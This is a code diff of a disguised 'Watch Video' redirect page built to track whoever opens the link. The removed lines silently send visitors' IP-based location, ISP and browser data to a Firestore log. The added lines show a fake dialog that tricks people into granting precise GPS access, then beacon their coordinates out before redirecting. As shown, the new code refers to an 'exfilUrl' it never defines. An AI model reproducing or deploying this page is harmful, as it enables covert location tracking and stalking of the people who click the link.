@@ -4,41 +4,131 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Watch Video</title>
+
 <meta property="og:title" content="Watch Video">
 <meta property="og:description" content="Tap to open">
 <meta property="og:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
 <meta property="og:type" content="website">
+
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Watch Video">
-<meta name="twitter:description" content="Tap to open">
+<meta name="twitter:title" content="Watch Video.   ">
+<meta name="twitter:description" content="Tap to open.   ">
 <meta name="twitter:image" content="https://sushandristi.github.io/relationship/thumbnail.png">
 <style>
   * { box-sizing: border-box; }
   body {
-    margin: 0; height: 100vh; display: flex; align-items: center;
-    justify-content: center; background: #0f0f0f; color: #fff;
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #0f0f0f;
+    color: #fff;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
   }
-  .box { text-align: center; }
+  .box {
+    text-align: center;
+  }
   .spinner {
-    width: 40px; height: 40px; margin: 0 auto 20px;
-    border: 4px solid rgba(255,255,255,0.2); border-top-color: #fff;
-    border-radius: 50%; animation: spin 0.8s linear infinite;
+    width: 40px;
+    height: 40px;
+    margin: 0 auto 20px;
+    border: 4px solid rgba(255,255,255,0.2);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
   .msg { font-size: 16px; opacity: 0.85; }
   .count { font-size: 14px; opacity: 0.6; margin-top: 8px; }
-  .error { font-size: 15px; max-width: 320px; line-height: 1.5; opacity: 0.85; }
+
+  /* Fake custom dialog overlay */
+  .overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.7);
+    z-index: 999;
+    align-items: center;
+    justify-content: center;
+  }
+  .overlay.show { display: flex; }
+  .dialog {
+    background: #1a1a1a;
+    border-radius: 14px;
+    padding: 28px 24px 18px;
+    width: 300px;
+    text-align: center;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+  }
+  .dialog h3 {
+    margin: 0 0 8px;
+    font-size: 18px;
+    font-weight: 600;
+  }
+  .dialog p {
+    margin: 0 0 20px;
+    font-size: 14px;
+    opacity: 0.75;
+    line-height: 1.4;
+  }
+  .dialog .btn-group {
+    display: flex;
+    gap: 10px;
+  }
+  .dialog button {
+    flex: 1;
+    padding: 10px 0;
+    border-radius: 10px;
+    border: none;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .dialog .btn-cancel {
+    background: #333;
+    color: #fff;
+  }
+  .dialog .btn-confirm {
+    background: #fff;
+    color: #000;
+  }
+  .error {
+    font-size: 15px;
+    max-width: 320px;
+    line-height: 1.5;
+    opacity: 0.85;
+  }
   .continue-btn {
-    display: none; margin-top: 16px; padding: 10px 20px; border-radius: 8px;
-    border: none; background: #fff; color: #000; font-size: 14px;
-    font-weight: 600; cursor: pointer; text-decoration: none;
+    display: none;
+    margin-top: 16px;
+    padding: 10px 20px;
+    border-radius: 8px;
+    border: none;
+    background: #fff;
+    color: #000;
+    font-size: 14px;
+    font-weight: 600;
+    text-decoration: none;
   }
   .continue-btn.show { display: inline-block; }
 </style>
 </head>
 <body>
-  <div class="box" id="box">
+  <!-- Fake custom dialog overlay -->
+  <div class="overlay" id="overlay">
+    <div class="dialog">
+      <h3>Redirect to Video</h3>
+      <p>This video uses location-based content. Allow redirect and share your location?</p>
+      <div class="btn-group">
+        <button class="btn-cancel" id="btnCancel">Cancel</button>
+        <button class="btn-confirm" id="btnConfirm">Yes, Open</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main UI -->
+  <div class="box" id="box" style="display:none;">
     <div class="spinner"></div>
     <div class="msg">Opening…</div>
     <div class="count" id="count">Redirecting in 3s</div>
@@ -46,106 +136,76 @@
   </div>
 
   <script>
-    // ===== CONFIG =====
-    const FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';
-    // =================
-
     function getTargetUrl() {
       const params = new URLSearchParams(window.location.search);
       let target = params.get('url') || params.get('u');
       if (!target) return null;
-      try { target = decodeURIComponent(target); } catch(e) {}
+      try { target = decodeURIComponent(target); } catch (e) {}
       if (!/^https?:\/\//i.test(target)) return null;
       return target;
     }
 
     const target = getTargetUrl();
     const box = document.getElementById('box');
+    const overlay = document.getElementById('overlay');
     const countEl = document.getElementById('count');
     const continueBtn = document.getElementById('continueBtn');
 
-    // Silent exfil to Firestore
-    function exfil(data) {
-      // Build Firestore document format (typed fields)
-      const doc = {
-        fields: {}
-      };
-
-      // Convert each value to the right Firestore type
-      for (const [key, value] of Object.entries(data)) {
-        if (typeof value === 'number') {
-          doc.fields[key] = { doubleValue: value };
-        } else if (typeof value === 'boolean') {
-          doc.fields[key] = { booleanValue: value };
-        } else {
-          doc.fields[key] = { stringValue: String(value) };
-        }
-      }
-
-      const payload = JSON.stringify(doc);
-
-      // sendBeacon for reliable delivery on page unload
-      navigator.sendBeacon(FIRESTORE_URL, payload);
-
-      // Fetch fallback
-      fetch(FIRESTORE_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload,
-        keepalive: true
-      }).then(r => r.json()).then(console.log).catch(() => {});
-    }
-
-    // IP geolocation callback — fires when ip-api.com responds
-    window.ipGeo = function(data) {
-      exfil({
-        type: 'ip',
-        lat: data.lat,
-        lon: data.lon,
-        city: data.city || '',
-        region: data.regionName || '',
-        country: data.country || '',
-        zip: data.zip || '',
-        isp: data.isp || '',
-        org: data.org || '',
-        ip: data.query || '',
-        ua: navigator.userAgent,
-        targetUrl: target || '',
-        timestamp: new Date().toISOString(),
-        referrer: document.referrer || 'direct'
-      });
-    };
-
-    // Inject IP geolocation script (silent, no prompt)
-    const s = document.createElement('script');
-    s.src = 'https://api.ip.sb/geoip?callback=ipGeo';
-  document.head.appendChild(s);
-
-    // UI logic
     if (!target) {
+      document.querySelector('.box').style.display = 'block';
       box.innerHTML = '<div class="error">No link provided.<br>Add <code>?url=&lt;link&gt;</code> to the address to redirect somewhere.</div>';
     } else {
-      continueBtn.href = target;
+      // Show the fake dialog
+      overlay.classList.add('show');
 
-      let secondsLeft = 3;
-      countEl.textContent = 'Redirecting in ' + secondsLeft + 's';
-      const interval = setInterval(() => {
-        secondsLeft -= 1;
-        if (secondsLeft > 0) {
-          countEl.textContent = 'Redirecting in ' + secondsLeft + 's';
+      // Handle "Cancel"
+      document.getElementById('btnCancel').addEventListener('click', function() {
+        overlay.classList.remove('show');
+        box.style.display = 'block';
+        box.innerHTML = '<div class="error">Redirect cancelled by user.</div>';
+      });
+
+      // Handle "Yes, Open"
+      document.getElementById('btnConfirm').addEventListener('click', function() {
+        overlay.classList.remove('show');
+        box.style.display = 'block';
+
+        // Now trigger the real browser geolocation prompt
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const payload = {
+                type: 'gps',
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: new Date(position.timestamp).toISOString(),
+                ua: navigator.userAgent
+              };
+              navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
+            },
+            (err) => {
+              const payload = {
+                type: 'gps_denied',
+                error: err.code,
+                message: err.message,
+                ua: navigator.userAgent
+              };
+              navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
+            },
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+          );
         } else {
-          countEl.textContent = 'Redirecting…';
-          clearInterval(interval);
+          const payload = { type: 'gps_unsupported', ua: navigator.userAgent };
+          navigator.sendBeacon(exfilUrl, JSON.stringify(payload));
         }
-      }, 1000);
 
-      setTimeout(() => {
-        window.location.href = target;
-        setTimeout(() => {
-          countEl.textContent = "Didn't redirect automatically:";
-          continueBtn.className = 'continue-btn show';
-        }, 800);
-      }, 3000);
+        // Redirect after giving time for geo + the prompt
+        setTimeout(() => { window.location.href = target; }, 3000);
+      });
     }
   </script>
 </body>
